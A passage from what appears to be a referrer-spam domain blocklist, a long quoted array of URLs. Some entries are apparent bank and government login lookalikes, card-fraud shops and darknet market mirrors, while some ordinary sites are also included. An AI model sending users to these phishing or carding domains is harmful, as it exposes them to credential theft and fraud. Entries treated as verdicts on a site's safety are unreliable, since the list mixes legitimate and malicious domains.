"https://emctestlab.ru", "https://emerson-rus.ru", "https://empire-market.org", "https://empire-market.xyz", "https://empiremarket-link.org", "https://empirestuff.org", "https://energomash.net", "https://energysexy.com", "https://englishtopic.ru", "https://enter-unicredit.ru", "https://epicdiving.com", "https://eraglass.com", "https://eric-artem.com", "https://erofus.online", "https://eropho.com", "https://eropho.net", "https://erot.co", "https://erotag.com", "https://es-pfrf.ru", "https://escort-russian.com", "https://eskei83.com", "https://esoterikforum.at", "https://estdj.com", "https://este-line.com.ua", "https://etairikavideo.gr", "https://etehnika.com.ua", "https://etotupo.ru", "https://ets-2-mod.ru", "https://eu-cookie-law-enforcement2.xyz", "https://eurocredit.xyz", "https://euromasterclass.ru", "https://europages.com.ru", "https://eurosamodelki.ru", "https://event-tracking.com", "https://eventiyahall.ru", "https://exclusive-profit.com", "https://exdocsfiles.com", "https://expediacustomerservicenumber.online", "https://expert-find.ru", "https://express-vyvoz.ru", "https://eyes-on-you.ga", "https://f1nder.org", "https://fainaidea.com", "https://falco3d.com", "https://falcoware.com", "https://fanoboi.com", "https://fartunabest.ru", "https://fashiong.ru", "https://fast-wordpress-start.com", "https://fastgg.net", "https://favoritki-msk.ru", "https://fazika.ru", "https://fbdownloader.com", "https://feminist.org.ua", "https://fialka.tomsk.ru", "https://fidalsa.de", "https://filesclub.net", "https://filesdatabase.net", "https://films2018.com", "https://filter-ot-zheleza.ru", "https://financial-simulation.com", "https://finansov.info", "https://finder.cool", "https://findercarphotos.com", "https://firstblog.top", "https://fit-discount.ru", "https://fitodar.com.ua", "https://fix-website-errors.com", "https://flexderek.com", "https://floating-share-buttons.com", "https://flowertherapy.ru", "https://flyblog.xyz", "https://foojo.net", "https://for-marketersy.info", "https://for-your.website", "https://forex-procto.ru", "https://forsex.info", "https://fortwosmartcar.pw", "https://forum69.info", "https://foxweber.com", "https://francaise-poesie.com", "https://frankofficial.ru", "https://frauplus.ru", "https://free-fb-traffic.com", "https://free-fbook-traffic.com", "https://free-floating-buttons.com", "https://free-games-download.falcoware.com", "https://free-share-buttons.com", "https://free-social-buttons.com", "https://free-social-buttons.xyz", "https://free-social-buttons7.xyz", "https://free-traffic.xyz", "https://free-video-tool.com", "https://free-website-traffic.com", "https://freenode.info", "https://freewhatsappload.com", "https://freewlan.info", "https://freshnails.com.ua", "https://fsalas.com", "https://fsin-pokypka.ru", "https://fullzdumps.cc", "https://furniturehomewares.com", "https://galblog.top", "https://game300.ru", "https://gandikapper.ru", "https://garantprava.com", "https://gasvleningrade.ru", "https://gatwick.ru", "https://gazel-72.ru", "https://gbh-invest.ru", "https://gearcraft.us", "https://gearsadspromo.club", "https://geliyballon.ru", "https://gelstate.ru", "https://generalporn.org", "https://geniusfood.co.uk", "https://georgeblog.online", "https://gepatit-info.top", "https://germes-trans.com", "https://get-clickize.info", "https://get-free-social-traffic.com", "https://get-free-traffic-now.com", "https://get-more-freeer-visitors.info", "https://get-more-freeish-visitors.info", "https://get-seo-help.com", "https://get-your-social-buttons.info", "https://getaadsincome.info", "https://getadsincomely.info", "https://getfy-click.info", "https://getlamborghini.ga", "https://getpy-click.info", "https://getrichquick.ml", "https://getrichquickly.info", "https://gezlev.com.ua", "https://ghazel.ru", "https://ghostvisitor.com", "https://gidonline.one", "https://gidro-partner.ru", "https://giftbig.ru", "https://girlporn.ru", "https://gk-casino.fun", "https://gk-casino.online", "https://gk-casino.ru", "https://gk-casino.site", "https://gk-casino.space", "https://gk-casino.website", "https://gkvector.ru", "https://glavprofit.ru", "https://global-smm.ru", "https://gobongo.info", "https://golden-praga.ru", "https://good-potolok.ru", "https://goodbyecellulite.ru", "https://goodhumor24.com", "https://goodprotein.ru", "https://google-liar.ru", "https://googlemare.com", "https://googlsucks.com", "https://gorgaz.info", "https://grafaman.ru", "https://greatblog.top", "https://greentechsy.com", "https://groshi-kredut.com.ua", "https://growth-hackingan.info", "https://growth-hackingor.info", "https://growth-hackingy.info", "https://gruzchiki24.ru", "https://guardlink.org", "https://guidetopetersburg.com", "https://halat.xyz", "https://halefa.com", "https://handicapvantoday.com", "https://hankspring.xyz", "https://happysong.ru", "https://hard-porn.mobi", "https://havepussy.com", "https://hawaiisurf.com", "https://hd1080film.ru", "https://hdhc.site", "https://hdmoviecamera.net", "https://hdmoviecams.com", "https://headpharmacy.com", "https://healbio.ru", "https://healgastro.com", "https://healthhacks.ru", "https://help.baidu.com/searchResult?keywords=", "https://hentai-manga.porn", "https://heroero.com", "https://hexometer.com", "https://hit-kino.ru", "https://holiday-shop.ru", "https://holistickenko.com", "https://holodkovich.com", "https://homeafrikalike.tk", "https://homemypicture.tk", "https://hongfanji.com", "https://hostiman.ru", "https://hosting-tracker.com", "https://hotblognetwork.com", "https://hottour.com", "https://housedesigning.ru", "https://housediz.com", "https://housemilan.ru", "https://howopen.ru", "https://howtostopreferralspam.eu", "https://hoztorg-opt.ru", "https://hseipaa.kz", "https://hulfingtonpost.com", "https://humanorightswatch.org", "https://hundejo.com", "https://huntdown.info", "https://hvd-store.com", "https://hydra-2019.ru", "https://hydra-2020.online", "https://hydra-2020.ru", "https://hydra-centr.fun", "https://hydra-guide.org", "https://hydra-new.online", "https://hydra-onion-faq.com", "https://hydra-pc.com", "https://hydra-shop.org", "https://hydra-site.ru", "https://hydra-vhod2020.com", "https://hydra-zerkalo20.com", "https://hydra2.market", "https://hydra2020.top", "https://hydra2020gate.com", "https://hydra2020market.com", "https://hydra2020onion.com", "https://hydra2020zerkalo.com", "https://hydra20onion.com", "https://hydra20online.com", "https://hydra20original.com", "https://hydra2use.com", "https://hydra2zahod.com", "https://hydraena.com", "https://hydrahow.com", "https://hydraland.net", "https://hydramarket2020.com", "https://hydramirror2020.com", "https://hydranten.net", "https://hydraonion2019.net", "https://hydraruz-2020.com", "https://hydraruzonion2020.com", "https://hydraruzxpnew4af.com.co", "https://hydraruzxpnew4af.ink", "https://hydraulicoilcooler.net", "https://hydrauliczny.com", "https://hydravizoficial.info", "https://hydrazerkalo2019.net", "https://hyip-zanoza.me", "https://i-spare.ru", "https://ib-homecredit.ru", "https://ib-rencredit.ru", "https://iceton.net", "https://ico.re", "https://ideayz.com", "https://igadgetsworld.com", "https://igru-xbox.net", "https://ilikevitaly.com", "https://iloveitaly.ro", "https://iloveitaly.ru", "https://ilovevitaly.co", "https://ilovevitaly.com", "https://ilovevitaly.info", "https://ilovevitaly.org", "https://ilovevitaly.ru", "https://ilovevitaly.xyz", "https://iminent.com", "https://immigrational.info", "https://imperiafilm.ru", "https://impotentik.com", "https://in-mostbet.ru", "https://in-sto.ru", "https://incanto.in.ua", "https://incitystroy.ru", "https://incomekey.net", "https://increasewwwtraffic.info", "https://inet-shop.su", "https://infektsii.com", "https://infodocsportal.com", "https://infogame.name", "https://inform-ua.info", "https://ingramreed.xyz", "https://inmoll.com", "https://insider.pro", "https://installspartners.com", "https://instasexyblog.com", "https://insultu-net.ru", "https://interferencer.ru", "https://intex-air.ru", "https://investpamm.ru", "https://iskalko.ru", "https://iskussnica.ru", "https://isotoner.com", "https://ispaniya-costa-blanca.ru", "https://it-max.com.ua", "https://it-worlds.com", "https://izamorfix.ru", "https://izhstrelok.ru", "https://janemill.xyz", "https://jav-fetish.com", "https://jav-fetish.site", "https://jav-idol.com", "https://javcoast.com", "https://javlibrary.cc", "https://jeffbullas.xyz", "https://jjbabskoe.ru", "https://job-opros.ru", "https://job-prosto.ru", "https://jobgirl24.ru", "https://jobius.com.ua", "https://josephineblog.top", "https://jumkite.com", "https://justkillingti.me", "https://justprofit.xyz", "https://kabbalah-red-bracelets.com", "https://kabinet-5ka.ru", "https://kabinet-alfaclick.ru", "https://kabinet-binbank.ru", "https://kabinet-card-5ka.ru", "https://kabinet-click-alfabank.ru", "https://kabinet-esia-gosuslugi.ru", "https://kabinet-faberlic.ru", "https://kabinet-gosuslugi.ru", "https://kabinet-ipoteka-domclick.ru", "https://kabinet-karta-5ka.ru", "https://kabinet-lk-megafon.ru", "https://kabinet-lk-rt.ru", "https://kabinet-login-mts.ru", "https://kabinet-mil.ru", "https://kabinet-mos.ru", "https://kabinet-my-beeline.ru", "https://kabinet-my-pochtabank.ru", "https://kabinet-nalog.ru", "https://kabinet-online-bm.ru", "https://kabinet-online-open.ru", "https://kabinet-online-rsb.ru", "https://kabinet-online-rshb.ru", "https://kabinet-online-sberbank.ru", "https://kabinet-online-sovcombank.ru", "https://kabinet-online-vtb.ru", "https://kabinet-pfr.ru", "https://kabinet-pfrf.ru", "https://kabinet-platon.ru", "https://kabinet-qiwi.ru", "https://kabinet-tele2.ru", "https://kabinet-tinkoff.ru", "https://kabinet-tricolor.ru", "https://kabinet-ttk.ru", "https://kabinet-vtb24.ru", "https://kakablog.net", "https://kakadu-interior.com.ua", "https://kakworldoftanks.ru", "https://kambasoft.com", "https://kamin-sam.ru", "https://kanakox.com", "https://karapuz.org.ua", "https://kazka.ru", "https://kazlenta.kz", "https://kazrent.com", "https://kerch.site", "https://kevblog.top", "https://keywords-monitoring-success.com", "https://keywords-monitoring-your-success.com", "https://kharkov.ua", "https://kierowca-praca.pl", "https://kinnarimasajes.com", "https://kino-fun.ru", "https://kino-key.info", "https://kino2018.cc", "https://kinobum.org", "https://kinopolet.net", "https://kinosed.net", "https://kinostar.online", "https://kiyany-za-spravedluvist.com.ua", "https://knigonosha.net", "https://kollekcioner.ru", "https://komp-pomosch.ru", "https://komputers-best.ru", "https://komukc.com.ua", "https://konkursov.net", "https://kosunnyclub.com", "https://kozhakoshek.com", "https://kozhasobak.com", "https://kozhniebolezni.com", "https://krasivoe-hd.net", "https://krasnodar-avtolombard.ru", "https://krasota-zdorovie.pw", "https://krasota.ru", "https://kredutu.com.ua", "https://kredytbank.com.ua", "https://kruiz-sochi.ru", "https://krumble-adsde.info", "https://krumble-adsen.info", "https://krumbleent-ads.info", "https://l2soft.eu", "https://lakiikraski.ru", "https://lalalove.ru", "https://laminat.com.ua", "https://landliver.org", "https://landoftracking.com", "https://laptop-4-less.com", "https://law-check-two.xyz", "https://law-enforcement-bot-ff.xyz", "https://law-enforcement-check-three.xyz", "https://law-enforcement-ee.xyz", "https://law-six.xyz", "https://lawrenceblog.online", "https://laxdrills.com", "https://leboard.ru", "https://ledalfa.by", "https://leddjc.net", "https://ledx.by", "https://leeboyrussia.com", "https://legalrc.biz", "https://lerporn.info", "https://leto-dacha.ru", "https://lider82.ru", "https://lifespeaker.ru", "https://ligastavok-in.ru", "https://lindsayblog.online", "https://lipidofobia.com.br", "https://littleberry.ru", "https://livefixer.com", "https://livejournal.top", "https://livia-pache.ru", "https://livingroomdecoratingideas.website", "https://lk-gosuslugi.ru", "https://lk-lk-rt.ru", "https://local-seo-for-multiple-locations.com", "https://login-tinkoff.ru", "https://logo-all.ru", "https://lolz.guru", "https://lolzteam.online", "https://lolzteam.org", "https://lotoflotto.ru", "https://loveorganic.ch", "https://lowpricesiterx.com", "https://lsex.xyz", "https://luckybull.io", "https://lukoilcard.ru", "https://lumb.co", "https://luton-invest.ru", "https://luxup.ru", "https://luxurybet.ru", "https://magicart.store", "https://magicdiet.gq", "https://magnetic-bracelets.ru", "https://mainhunter.com", "https://makemoneyonline.com", "https://makeprogress.ga", "https://makler.org.ua", "https://maltadailypost.com", "https://mamylik.ru", "https://manimpotence.com", "https://marathonbet-in.ru", "https://marblestyle.ru", "https://maridan.com.ua", "https://marinetraffic.com", "https://marjorieblog.online", "https://marketland.ml", "https://martinahome.xyz", "https://masterseek.com", "https://matomete.net", "https://matras.space", "https://mattgibson.us", "https://max-apprais.com", "https://maxinesamson.top", "https://maxxximoda.ru", "https://mebel-arts.com", "https://mebel-ekb.com", "https://mebel-iz-dereva.kiev.ua", "https://mebelcomplekt.ru", "https://mebeldekor.com.ua", "https://meblieco.com", "https://med-dopomoga.com", "https://med-recept.ru", "https://med-zdorovie.com.ua", "https://medbrowse.info", "https://medcor-list.ru", "https://medic-al.ru", "https://medicaltranslate.ru", "https://medicineseasybuy.com", "https://meds-online24.com", "https://meduza-consult.ru", "https://megalit-d.ru", "https://megapolis-96.ru", "https://megatkani.ru", "https://melbet-in.ru", "https://melissahome.top", "https://meriton.ru", "https://metallo-konstruktsii.ru", "https://metallosajding.ru", "https://meteocast.net", "https://mhp.su", "https://miaxxx.com", "https://midnight.im", "https://mifepriston.net", "https://migronis.com", "https://mikozstop.com", "https://mikrocement.com.ua", "https://mikrozaim.site", "https://mikrozaym2you.ru", "https://minegam.com", "https://miningblack.net", "https://mirfairytale.ru", "https://mirobuvi.com.ua", "https://mirtorrent.net", "https://misselle.ru", "https://mksoap.ru", "https://mksport.ru", "https://mmdoors.ru", "https://mmm.lc", "https://mmm.sb", "https://mnogabukaff.net", "https://mobicover.com.ua", "https://mobilemedia.md", "https://mockupui.com", "https://modforwot.ru", "https://modnie-futbolki.net", "https://moe1.ru", "https://moinozhki.com", "https://moiragracie.top", "https://moisadogorod.ru", "https://monetizationking.net", "https://money-for-placing-articles.com", "https://money7777.info", "https://moneytop.ru", "https://moneyzzz.ru", "https://monicablog.xyz", "https://moon.market", "https://moonci.ru", "https://mosputana.info", "https://mosputana.top", "https://mosrif.ru", "https://mostbet-original.ru", "https://mostcool.top", "https://mostorgnerud.ru", "https://moy-dokument.com", "https://moy-evroopt.ru", "https://moyakuhnia.ru", "https://moyaskidka.ru", "https://moygorod-online.ru", "https://moyparnik.com", "https://mrbojikobi4.biz", "https://mrt-info.ru", "https://msk-sprawka.com", "https://mtsguru.ru", "https://muscle-factory.com.ua", "https://musichallaudio.ru", "https://mwductwork.com", "https://mybestoffers.club", "https://myborder.ru", "https://mybuh.kz", "https://mycheaptraffic.com", "https://mycollegereview.com", "https://mydirtystuff.com", "https://mydoctorok.ru", "https://myecomir.com", "https://myftpupload.com", "https://myplaycity.com", "https://mysexpics.ru", "https://nachalka21.ru", "https://nakozhe.com", "https://nancyblog.top", "https://nanochskazki.ru", "https://naobumium.info", "https://narosty.com", "https://natali-forex.com", "https://natprof.ru", "https://naturalpharm.com.ua", "https://navek.by", "https://nbok.net", "https://needtosellmyhousefast.com", "https://net-profits.xyz", "https://nevapotolok.ru", "https://newagebev.com", "https://newsrosprom.ru", "https://newstaffadsshop.club", "https://nicola.top", "https://niki-mlt.ru", "https://ninacecillia.top", "https://no-rx.info", "https://nomerounddec.cf", "https://novosti-avto.ru", "https://novosti-hi-tech.ru", "https://novostic.ru", "https://ntdtv.ru", "https://nubuilderian.info", "https://nufaq.com", "https://nwrcz.com", "https://nyinfo.org", "https://o-o-11-o-o.com", "https://o-o-6-o-o.com", "https://o-o-6-o-o.ru", "https://o-o-8-o-o.com", "https://o-o-8-o-o.ru", "https://o-promyshlennosti.ru", "https://obnallpro.cc", "https://obsessionphrases.com", "https://obyavka.org.ua", "https://obzor-casino-x.online", "https://obzor-casino-x.ru", "https://odiabetikah.com", "https://odsadsmobile.biz", "https://ofermerah.com", "https://office2web.com", "https://officedocuments.net", "https://ogorodnic.com", "https://okna-systems.pro", "https://okno.ooo", "https://okoshkah.com", "https://olovoley.ru", "https://one-a-plus.xyz", "https://onionhydra.net", "https://online-akbars.ru", "https://online-binbank.ru", "https://online-hit.info", "https://online-intim.com", "https://online-mkb.ru", "https://online-pharma.ru", "https://online-pochtabank.ru", "https://online-raiffeisen.ru", "https://online-sbank.ru", "https://online-templatestore.com", "https://online-vostbank.ru", "https://online-vtb.ru", "https://onlinedic.net", "https://onlinetvseries.me", "https://onlinewot.ru", "https://onlywoman.org", "https://oohlivecams.com", "https://ooo-olni.ru", "https://oooh.pro", "https://optsol.ru", "https://oqex.io", "https://oracle-patches.ru", "https://orakul.spb.ru", "https://osteochondrosis.ru", "https://otdbiaxaem-vmeste.ru", "https://otdyx-s-komfortom.ru", "https://oudallas.net", "https://ownshop.cf", "https://ozas.net", "https://pacobarrero.com", "https://pageinsider.org", "https://paidonlinesites.com", "https://painting-planet.com", "https://palma-de-sochi.ru", "https://palvira.com.ua", "https://pamjatnik.com.ua", "https://pamyatnik-spb.ru", "https://pamyatnik-tsena.ru", "https://paretto.ru", "https://parking-invest.ru", "https://partizan19.ru", "https://partnerskie-programmy.net", "https://paulinho.ru", "https://pay.ru", "https://pc-services.ru", "https://penzu.xyz", "https://perform-like-alibabaity.info", "https://perform-likeism-alibaba.info", "https://perm.dienai.ru", "https://perper.ru", "https://petrovka-online.com", "https://petrushka-restoran.ru", "https://pfrf-kabinet.ru", "https://pharm--shop.ru", "https://photo-clip.ru", "https://photokitchendesign.com", "https://php-market.ru", "https://picturesmania.com", "https://pills24h.com", "https://piluli.info", "https://pinupcasinos.ru", "https://pinupcasinos1.ru", "https://piratbike.ru", "https://pirelli-matador.ru", "https://piulatte.cz", "https://pizdeishn.com", "https://pizdeishn.net", "https://pizza-imperia.com", "https://pizza-tycoon.com", "https://pk-pomosch.ru", "https://pk-services.ru", "https://plagscan.com", "https://play.google.com/store/search?q=", "https://podarkilove.ru", "https://poddon-moskva.ru", "https://podemnik.pro", "https://podseka1.ru", "https://poiskzakona.ru", "https://poker-royal777.com", "https://pokupaylegko.ru", "https://polemikon.ru", "https://politika.bg", "https://polyana-skazok.org.ua", "https://popads.net", "https://popelina.com", "https://pops.foundation", "https://popugauka.ru", "https://popugaychiki.com", "https://porndl.org", "https://pornhive.org", "https://pornhub-forum.ga", "https://pornhub-ru.com", "https://porno-asia.com", "https://porno-chaman.info", "https://porno-gallery.ru", "https://porno2xl.net", "https://pornobest.su", "https://pornoelita.info", "https://pornoforadult.com", "https://pornogig.com", "https://pornohd1080.online", "https://pornoklad.ru", "https://pornonik.com", "https://pornoplen.com", "https://pornosemki.info", "https://pornoslave.net", "https://portnoff.od.ua", "https://pospektr.ru", "https://posteezy.xyz", "https://potolokelekor.ru", "https://povodok-shop.ru", "https://pozdravleniya-c.ru", "https://predmety.in.ua", "https://prezidentshop.ru", "https://priceg.com", "https://pricheski-video.com", "https://primfootball.com", "https://print-technology.ru", "https://private-service.best", "https://prizrn.site", "https://prlog.ru", "https://probenzo.com.ua", "https://procrafts.ru", "https://prodaemdveri.com", "https://producm.ru", "https://prodvigator.ua", "https://professionalsolutions.eu", "https://profnastil-moscow.ru", "https://progressive-seo.com", "https://prointer.net.ua", "https://prom23.ru", "https://promoforum.ru", "https://promoteapps.online", "https://promotion-for99.com", "https://pron.pro", "https://prosmibank.ru", "https://prostitutki-rostova.ru.com", "https://prostoacc.com", "https://psa48.ru", "https://psn-card.ru", "https://ptashkatextil.ua", "https://ptfic.org", "https://punch.media", "https://purchasepillsnorx.com", "https://puzzleweb.ru", "https://qoinex.top", "https://qualitymarketzone.com", "https://quickchange.cc", "https://quit-smoking.ga", "https://qwesa.ru", "https://r.search.yahoo.com", "https://r.search.yahoo.com/", "https://rachelblog.online", "https://rainbirds.ru", "https://rangjued.com", "https://rank-checker.online", "https://rankings-analytics.com", "https://ranksonic.info", "https://ranksonic.net", "https://ranksonic.org", "https://rapidgator-porn.ga", "https://rapidsites.pro", "https://raschtextil.com.ua", "https://raymondblog.top", "https://razborka-skoda.org.ua", "https://rb-str.ru", "https://rcb101.ru", "https://realresultslist.com", "https://recinziireale.com", "https://rednise.com", "https://redraincine.com", "https://reginablog.top", "https://reginanahum.top", "https://regionshop.biz", "https://reklamnoe.agency", "https://releshop.ru", "https://remkompov.ru", "https://remont-kvartirspb.com", "https://remontvau.ru", "https://rent2spb.ru", "https://replica-watch.ru", "https://research.ifmo.ru", "https://resell-seo-services.com", "https://resellerclub.com", "https://responsive-test.net", "https://resurs-2012.ru", "https://reversing.cc", "https://revolgc.pro", "https://rfavon.ru", "https://rightenergysolutions.com.au", "https://roof-city.ru", "https://room-mebel.ru", "https://rospromtest.ru", "https://royal-casino.online", "https://royal-casino.ru", "https://royal-casinos.online", "https://royal-casinos.ru", "https://royal-cazino.online", "https://royal-cazino.ru", "https://rspectr.com", "https://ru-lk-rt.ru", "https://ru-onion.com", "https://ru-online-sberbank.ru", "https://ruinfocomp.ru", "https://rulate.ru", "https://rumamba.com", "https://rupolitshow.ru", "https://rus-lit.com", "https://rusexy.xyz", "https://ruspoety.ru", "https://russian-postindex.ru", "https://russian-translator.com", "https://russkie-sochineniya.ru", "https://rustag.ru", "https://rutor.group", "https://rxshop.md", "https://rybalka-opt.ru", "https://s-forum.biz", "https://s-luna.me", "https://sabinablog.xyz", "https://sad-torg.com.ua", "https://sady-urala.ru", "https://saltspray.ru", "https://samanthablog.online", "https://samara-airport.com", "https://samara-comfort.ru", "https://samchist.ru", "https://samlaurabrown.top", "https://samogonius.ru", "https://sanjosestartups.com", "https://santaren.by", "https://santasgift.ml", "https://santehnovich.ru", "https://sapaship.ru", "https://sauna-v-ufe.ru", "https://sauni-lipetsk.ru", "https://sauni-moskva.ru", "https://savetubevideo.com", "https://savetubevideo.info", "https://scansafe.net", "https://scat.porn", "https://screen-led.ru", "https://screentoolkit.com", "https://scripted.com", "https://search-error.com", "https://searchencrypt.com", "https://security-corporation.com.ua", "https://sel-hoz.com", "https://selfhotdog.com", "https://sell-fb-group-here.com", "https://semalt.com", "https://semaltmedia.com", "https://seo-2-0.com", "https://seo-platform.com", "https://seo-services-b2b.com", "https://seo-services-wordpress.com", "https://seo-smm.kz", "https://seo-tips.top", "https://seoanalyses.com", "https://seobook.top", "https://seocheckupx.com", "https://seocheckupx.net", "https://seoexperimenty.ru", "https://seojokes.net", "https://seopub.net", "https://seoservices2018.com", "https://serialsx.ru", "https://sex-porno.site", "https://sexpornotales.net", "https://sexreliz.com", "https://sexreliz.net", "https://sexsaoy.com", "https://sexuria.net", "https://sexyali.com", "https://shagtomsk.ru", "https://share-buttons-for-free.com", "https://share-buttons.xyz", "https://sharebutton.io", "https://sharebutton.net", "https://sharebutton.to", "https://sheki-spb.ru", "https://shnyagi.net", "https://shop2hydra.com", "https://shop4fit.ru", "https://shopfishing.com.ua", "https://shoppingmiracles.co.uk", "https://shoprybalka.ru", "https://shops-ru.ru", "https://shopsellcardsdumps.com", "https://shtaketniki.ru", "https://shulepov.ru", "https://sib-kukla.ru", "https://sibecoprom.ru", "https://sibkukla.ru", "https://sign-service.ru", "https://silvergull.ru", "https://sim-dealer.ru", "https://similarmoviesdb.com", "https://simoncinicancertherapy.com", "https://simple-share-buttons.com", "https://sinhronperevod.ru", "https://site-auditor.online", "https://site5.com", "https://siteripz.net", "https://sitesadd.com", "https://sitevaluation.org", "https://skidku.org.ua", "https://skinali.com", "https://skinali.photo-clip.ru", "https://sladkoevideo.com", "https://sledstvie-veli.net", "https://slftsdybbg.ru", "https://slkrm.ru", "https://slomm.ru", "https://slotron.com", "https://slow-website.xyz", "https://smailik.org", "https://smartphonediscount.info", "https://smt4.ru", "https://snabs.kz", "https://snaiper-bg.net", "https://sneakerfreaker.com", "https://snegozaderzhatel.ru", "https://snip.to", "https://snip.tw", "https://soaksoak.ru", "https://sochi-3d.ru", "https://social-button.xyz", "https://social-buttons-ii.xyz", "https://social-buttons.com", "https://social-traffic-1.xyz", "https://social-traffic-2.xyz", "https://social-traffic-3.xyz", "https://social-traffic-4.xyz", "https://social-traffic-5.xyz", "https://social-traffic-7.xyz", "https://social-widget.xyz", "https://socialbuttons.xyz", "https://socialseet.ru", "https://socialtrade.biz", "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=", "https://sohoindia.net", "https://solitaire-game.ru", "https://solnplast.ru", "https://sosdepotdebilan.com", "https://souvenirua.com", "https://sovetogorod.ru", "https://sovetskie-plakaty.ru", "https://sowhoz.ru", "https://soyuzexpedition.ru", "https://sp-laptop.ru", "https://sp-zakupki.ru", "https://space2019.top", "https://spain-poetry.com", "https://spartania.com.ua", "https://spb-plitka.ru", "https://spb-scenar.ru", "https://specstroy36.ru", "https://speedup-my.site", "https://spin2016.cf", "https://sportobzori.ru", "https://sportwizard.ru", "https://spravka130.ru", "https://spravkavspb.net", "https://spravkavspb.work", "https://sprawka-help.com", "https://spy-app.info", "https://sqadia.com", "https://squarespace.top", "https://sribno.net", "https://sssexxx.net", "https://ssve.ru", "https://st-komf.ru", "https://sta-grand.ru", "https://stat.lviv.ua", "https://stavimdveri.ru", "https://steamcommunity.com/market/search?q=", "https://steame.ru", "https://stiralkovich.ru", "https://stocktwists.com", "https://stoletie.ru", "https://stoliar.org", "https://stomatologi.moscow", "https://stop-nark.ru", "https://stop-zavisimost.com", "https://store-rx.com", "https://strady.org.ua", "https://stream-tds.com", "https://stroi-24.ru", "https://stroy-matrix.ru", "https://stroyalp.ru", "https://stroyka-gid.ru", "https://stroyka47.ru", "https://studentguide.ru", "https://stuffhydra.com", "https://stylecaster.top", "https://su1ufa.ru", "https://success-seo.com", "https://sudachitravel.com", "https://sundrugstore.com", "https://super-seo-guru.com", "https://superiends.org", "https://supermama.top", "https://supermodni.com.ua", "https://superoboi.com.ua", "https://superslots-casino.online", "https://superslots-casino.site", "https://superslots-cazino.online", "https://superslots-cazino.site", "https://superslotz-casino.site", "https://superslotz-cazino.site", "https://supervesti.ru", "https://svadba-teplohod.ru", "https://svensk-poesi.com", "https://svet-depo.ru", "https://svetka.info", "https://svetoch.moscow", "https://svoimi-rukamy.com", "https://svs-avto.com", "https://swaplab.io", "https://sweet.tv", "https://t-machinery.ru", "https://t-rec.su", "https://taihouse.ru", "https://tam-gde-more.ru", "https://tamada69.com", "https://tammyblog.online", "https://targetpay.nl", "https://tattoo-stickers.ru", "https://tattooha.com", "https://tcenavoprosa.ru", "https://td-abs.ru", "https://td-l-market.ru", "https://td-perimetr.ru", "https://tdbatik.com", "https://tds-west.ru", "https://technika-remont.ru", "https://tedxrj.com", "https://telfer.ru", "https://teman.com.ua", "https://tennis-bet.ru", "https://tentcomplekt.ru", "https://teplohod-gnezdo.ru", "https://teplokomplex.ru", "https://teresablog.top", "https://tesla-audit.ru", "https://texnika.com.ua", "https://tgsubs.com", "https://tgtclick.com", "https://thaimassage-slon.ru", "https://thaoduoctoc.com", "https://the-world.ru", "https://theautoprofit.ml", "https://theguardlan.com", "https://thelotter.su", "https://thesensehousehotel.com", "https://thesmartsearch.net", "https://timmy.by", "https://tocan.biz", "https://tocan.com.ua", "https://tokshow.online", "https://tomck.com", "https://top-gan.ru", "https://top-instagram.info", "https://top-l2.com", "https://top1-seo-service.com", "https://top10-online-games.com", "https://top10-way.com", "https://topmebeltorg.ru", "https://toposvita.com", "https://topquality.cf", "https://topseoservices.co", "https://torobrand.com", "https://torospa.ru", "https://torrentgamer.net", "https://torrentred.games", "https://track-rankings.online", "https://tracker24-gps.ru", "https://trafers.com", "https://traffic-cash.xyz", "https://traffic2cash.org", "https://traffic2cash.xyz", "https://traffic2money.com", "https://trafficgenius.xyz", "https://trafficmonetize.org", "https://trafficmonetizer.org", "https://transit.in.ua", "https://traphouselatino.net", "https://travel-semantics.com", "https://trex.casino", "https://tricolortv-online.com", "https://trieste.io", "https://trion.od.ua", "https://truebeauty.cc", "https://tsatu.edu.ua", "https://tsc-koleso.ru", "https://tuningdom.ru", "https://tvfru.org", "https://twsufa.ru", "https://ua.tc", "https://uasb.ru", "https://ucanfly.ru", "https://ucoz.ru", "https://udav.net", "https://ufa.dienai.ru", "https://ufolabs.net", "https://uginekologa.com", "https://ukrainian-poetry.com", "https://ukrcargo.com", "https://ukrtvory.in.ua", "https://ul-potolki.ru", "https://undergroundcityphoto.com", "https://unibus.su", "https://univerfiles.com", "https://unlimitdocs.net", "https://unpredictable.ga", "https://uptime-as.net", "https://uptime-eu.net", "https://uptime-us.net", "https://uptime.com", "https://uptimechecker.com", "https://urblog.xyz", "https://uruto.ru", "https://uslugi-tatarstan.ru", "https://uyut-dom.pro", "https://uyutmaster73.ru", "https://uzpaket.com", "https://uzungil.com", "https://v-casino.fun", "https://v-casino.host", "https://v-casino.ru", "https://v-casino.site", "https://v-casino.website", "https://v-casino.xyz", "https://v-cazino.online", "https://v-cazino.ru", "https://vaderenergy.ru", "https://valid-cc.com", "https://validccseller.com", "https://validus.pro", "https://vape-x.ru", "https://vardenafil20.com", "https://varikozdok.ru", "https://vavada-cazino.site", "https://vbikse.com", "https://vchulkah.net", "https://veles.shop", "https://veloland.in.ua", "https://ventopt.by", "https://veronicablog.top", "https://vescenter.ru", "https://veselokloun.ru", "https://vesnatehno.com", "https://vetbvc.ru", "https://vezdevoz.com.ua", "https://vgoloveboli.net", "https://viagra-soft.ru", "https://video--production.com", "https://video-woman.com", "https://videochat.guru", "https://videochat.world", "https://videos-for-your-business.com", "https://videotop.biz", "https://viel.su", "https://viktoria-center.ru", "https://virtual-zaim.ru", "https://virtualbb.com", "https://virus-schutzmasken.de", "https://vk.com/profile.php?redirect=", "https://vkonche.com", "https://vksex.ru", "https://vladtime.ru", "https://vodabur.by", "https://vodaodessa.com", "https://vodkoved.ru", "https://volond.com", "https://vpdr.pl", "https://vrazbor59.ru", "https://vsdelke.ru", "https://vseigru.one", "https://vseigry.fun", "https://vseprobrak.ru", "https://vulkan-oficial.com", "https://vzheludke.com", "https://vzubah.com", "https://vzube.com", "https://vzubkah.com", "https://w2mobile-za.com", "https://w3javascript.com", "https://wakeupseoconsultant.com", "https://wallet-prlzn.space", "https://wallinside.top", "https://wallpaperdesk.info", "https://wallpapers-all.com", "https://warmex.com.ua", "https://wave-games.ru", "https://wayfcoin.space", "https://wdss.com.ua", "https://we-ping-for-youic.info", "https://web-analytics.date", "https://web-revenue.xyz", "https://webalex.pro", "https://weblibrary.win", "https://webmaster-traffic.com", "https://webmonetizer.net", "https://website-analytics.online", "https://website-analyzer.info", "https://website-speed-check.site", "https://website-speed-checker.site", "https://websitebottraffic.host", "https://websites-reviews.com", "https://websocial.me", "https://weburlopener.com", "https://weebly.com", "https://weightbelts.ru", "https://wfdesigngroup.com", "https://wmasterlead.com", 